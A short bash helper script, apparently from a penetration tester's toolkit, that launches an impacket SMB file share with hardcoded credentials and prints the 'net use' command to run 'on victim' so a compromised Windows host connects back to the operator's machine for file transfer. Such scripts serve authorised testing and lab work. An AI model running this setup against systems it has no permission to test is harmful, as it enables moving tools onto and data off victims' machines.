#!/usr/bin/env bash
curdir=$(pwd)
ip=$(hostname -I | cut -d" " -f2 | grep "192.168")

# ---- without smb2 -----------

#echo "Smb server with name -> share, started on directory ->" $curdir
#printf "Usage on victim --> net use %s%s\share\n" '\\' "$ip"
#sudo impacket-smbserver share .
#echo "Terminated"

# ---- with smb2 -----------
echo "Smb server with name -> share, started with u:abz & p:abz on directory ->" $curdir
printf "Usage on victim --> net use %s%s\share /u:abz abz \n" '\\' "$ip"
sudo impacket-smbserver share . -smb2support -username abz -password abz
echo "Terminated"
